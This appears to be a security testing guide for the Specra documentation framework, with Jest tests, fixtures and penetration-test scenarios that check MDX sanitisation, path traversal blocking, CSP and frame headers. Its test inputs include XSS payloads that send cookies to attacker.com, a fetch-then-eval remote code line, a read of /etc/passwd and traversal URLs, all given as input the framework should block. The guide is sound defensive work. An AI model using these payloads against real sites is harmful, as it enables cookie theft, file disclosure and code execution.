# Security Testing Guide

This guide helps you test the security features of your Specra documentation site.

## Table of Contents

- [Automated Security Tests](#automated-security-tests)
- [Manual Security Tests](#manual-security-tests)
- [Penetration Testing Scenarios](#penetration-testing-scenarios)
- [CI/CD Integration](#cicd-integration)

## Automated Security Tests

### 1. MDX Content Validation Test

Create a test file to validate MDX security:

```typescript
// tests/security/mdx-validation.test.ts
import { validateMDXSecurity, scanMDXForDangerousPatterns } from 'specra/lib/mdx-security'

describe('MDX Security Validation', () => {
  it('should block eval() expressions', () => {
    const content = `
# Test Page

{eval("malicious code")}
    `
    const result = validateMDXSecurity(content, { strictMode: true })
    expect(result.valid).toBe(false)
    expect(result.issues.length).toBeGreaterThan(0)
  })

  it('should block fetch() calls', () => {
    const content = `
{fetch("https://attacker.com/steal-data").then(r => r.text())}
    `
    const result = validateMDXSecurity(content, { strictMode: true })
    expect(result.valid).toBe(false)
  })

  it('should block script tags', () => {
    const content = `
<script>alert('XSS')</script>
    `
    const sanitized = validateMDXSecurity(content)
    expect(sanitized.sanitized).not.toContain('<script>')
  })

  it('should block event handlers', () => {
    const content = `
<img src="x" onerror="alert('XSS')" />
    `
    const sanitized = validateMDXSecurity(content)
    expect(sanitized.sanitized).not.toContain('onerror')
  })

  it('should allow safe content', () => {
    const content = `
# Safe Content

This is **safe** content with [links](https://example.com).

<Callout type="info">
  This is a safe component
</Callout>
    `
    const result = validateMDXSecurity(content)
    expect(result.valid).toBe(true)
    expect(result.issues.length).toBe(0)
  })
})
```

### 2. Path Traversal Protection Test

```typescript
// tests/security/path-traversal.test.ts
import { sanitizePath, validatePathWithinDirectory } from 'specra/lib/mdx-security'

describe('Path Traversal Protection', () => {
  it('should block ../ patterns', () => {
    expect(() => sanitizePath('../../../etc/passwd')).toThrow('Path traversal detected')
  })

  it('should block encoded traversal', () => {
    expect(() => sanitizePath('%2e%2e%2f')).toThrow('Path traversal detected')
  })

  it('should block double-encoded traversal', () => {
    expect(() => sanitizePath('%252e%252e%252f')).toThrow('Path traversal detected')
  })

  it('should block absolute paths', () => {
    expect(() => sanitizePath('/etc/passwd')).toThrow('Path traversal detected')
  })

  it('should allow safe paths', () => {
    expect(sanitizePath('docs/getting-started')).toBe('docs/getting-started')
    expect(sanitizePath('api/reference/index')).toBe('api/reference/index')
  })

  it('should validate directory boundaries', () => {
    const allowedDir = '/app/docs'
    expect(validatePathWithinDirectory('guide.mdx', allowedDir)).toBe(true)
    expect(validatePathWithinDirectory('../../../etc/passwd', allowedDir)).toBe(false)
  })
})
```

### 3. Component Allowlist Test

```typescript
// tests/security/component-validation.test.ts
import { validateMDXComponents } from 'specra/lib/mdx-security'

describe('Component Validation', () => {
  it('should allow safe components', () => {
    const content = `
<Callout type="info">Safe component</Callout>
<CodeBlock language="typescript">code</CodeBlock>
    `
    const result = validateMDXComponents(content)
    expect(result.valid).toBe(true)
  })

  it('should block unknown components', () => {
    const content = `
<DangerousComponent onClick={() => eval('malicious')} />
    `
    const result = validateMDXComponents(content)
    expect(result.valid).toBe(false)
    expect(result.issues).toContain('Unsafe component detected: DangerousComponent')
  })
})
```

### 4. Security Headers Test

```typescript
// tests/security/headers.test.ts
import { generateCSPHeader, SECURITY_HEADERS } from 'specra/lib/mdx-security'

describe('Security Headers', () => {
  it('should generate valid CSP header', () => {
    const csp = generateCSPHeader(undefined, true)
    expect(csp).toContain("default-src 'self'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).not.toContain("'unsafe-eval'") // Production mode
  })

  it('should include unsafe-eval in development', () => {
    const csp = generateCSPHeader(undefined, false)
    expect(csp).toContain("'unsafe-eval'")
  })

  it('should have all required security headers', () => {
    expect(SECURITY_HEADERS).toHaveProperty('X-Frame-Options')
    expect(SECURITY_HEADERS).toHaveProperty('X-Content-Type-Options')
    expect(SECURITY_HEADERS).toHaveProperty('X-XSS-Protection')
  })
})
```

## Manual Security Tests

### Test 1: XSS Prevention

Create a test MDX file:

```mdx
<!-- tests/fixtures/xss-test.mdx -->
---
title: XSS Test
---

# XSS Attack Vectors

Try these attacks - they should all be blocked:

1. Script tag: <script>alert('XSS')</script>
2. Event handler: <img src="x" onerror="alert('XSS')" />
3. JavaScript protocol: <a href="javascript:alert('XSS')">Click me</a>
4. Eval expression: {eval("alert('XSS')")}
5. Fetch call: {fetch("https://attacker.com/steal")}
```

**Expected Result:** None of these should execute. Check browser console for security warnings.

### Test 2: Path Traversal

Try accessing these URLs:

```
# ❌ Should return 400/403
/docs/v1.0.0/../../../etc/passwd
/docs/v1.0.0/%2e%2e%2f%2e%2e%2f
/docs/v1.0.0/%252e%252e%252f

# ✅ Should work normally
/docs/v1.0.0/getting-started
/docs/v1.0.0/api/reference
```

### Test 3: CSP Validation

1. Open browser DevTools (F12)
2. Go to Console tab
3. Try running: `eval("console.log('test')")`
4. **Expected:** CSP error in production mode

### Test 4: Frame Protection

Create a test HTML file:

```html
<!-- test-frame.html -->
<!DOCTYPE html>
<html>
<body>
  <iframe src="http://localhost:3000/docs"></iframe>
</body>
</html>
```

**Expected:** Frame should be blocked by X-Frame-Options header.

## Penetration Testing Scenarios

### Scenario 1: Mintlify-Style RCE Attack

**Attack Vector:** Malicious MDX expression attempting server-side code execution

```mdx
---
title: RCE Test
---

{!!fetch("https://attacker.com").then(r => r.text()).then(c => eval(c))}

{import("fs").then(fs => fs.readFileSync("/etc/passwd", "utf-8"))}
```

**Test:**
1. Create this MDX file in your docs
2. Build the site
3. Check build logs for security warnings
4. Verify file is rejected in production

**Expected:** Build should fail or content should be sanitized.

### Scenario 2: Path Traversal via Static Assets

**Attack Vector:** Access files outside docs directory

```bash
# Try these URLs
curl http://localhost:3000/_next/static/../../package.json
curl http://localhost:3000/docs/images/..%2f..%2f..%2fpackage.json
```

**Expected:** 400 Bad Request or 403 Forbidden

### Scenario 3: Cross-Domain XSS

**Attack Vector:** If hosting docs on `docs.example.com`, try to access `app.example.com` cookies

```mdx
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      origin: window.origin
    })
  })
</script>
```

**Expected:** Script blocked by CSP and content sanitization.

### Scenario 4: Component Injection

**Attack Vector:** Inject malicious custom component

```mdx
<MaliciousComponent
  onLoad={() => {
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: document.cookie
    })
  }}
/>
```

**Expected:** Component rejected as not in allowlist.

## CI/CD Integration

### GitHub Actions Example

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run security tests
        run: npm run test:security

      - name: Audit dependencies
        run: npm audit --audit-level=high

      - name: Check for vulnerable dependencies
        run: npx audit-ci --high

      - name: Scan MDX files
        run: npm run scan:mdx

      - name: Build with strict mode
        run: NODE_ENV=production npm run build
        env:
          STRICT_SECURITY: true
```

### Custom MDX Scanner Script

```typescript
// scripts/scan-mdx.ts
import { scanMDXForDangerousPatterns } from 'specra/lib/mdx-security'
import fs from 'fs'
import path from 'path'
import { glob } from 'glob'

async function scanAllMDX() {
  const files = await glob('docs/**/*.mdx')
  let issuesFound = false

  for (const file of files) {
    const content = fs.readFileSync(file, 'utf-8')
    const issues = scanMDXForDangerousPatterns(content)

    if (issues.length > 0) {
      console.error(`❌ Security issues in ${file}:`)
      issues.forEach(issue => console.error(`  - ${issue}`))
      issuesFound = true
    } else {
      console.log(`✅ ${file}`)
    }
  }

  if (issuesFound) {
    process.exit(1)
  }
}

scanAllMDX()
```

Add to package.json:

```json
{
  "scripts": {
    "scan:mdx": "tsx scripts/scan-mdx.ts",
    "test:security": "jest tests/security"
  }
}
```

## Security Audit Checklist

- [ ] All MDX files scanned for dangerous patterns
- [ ] Path traversal tests pass
- [ ] XSS prevention tests pass
- [ ] CSP headers properly configured
- [ ] Security headers present
- [ ] Component allowlist enforced
- [ ] Dependencies audited
- [ ] Build succeeds in strict mode
- [ ] No console errors in production
- [ ] Frame protection working
- [ ] Cookie scope properly configured
- [ ] HTTPS enforced
- [ ] Rate limiting configured
- [ ] Monitoring and alerts set up

## Reporting Security Issues

If you discover a security vulnerability during testing:

1. Do NOT commit the vulnerable code
2. Do NOT open a public issue
3. Report privately to the security team
4. Include full details and reproduction steps

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MDX Security Best Practices](https://mdxjs.com/guides/security/)
- [Content Security Policy Testing](https://csp-evaluator.withgoogle.com/)
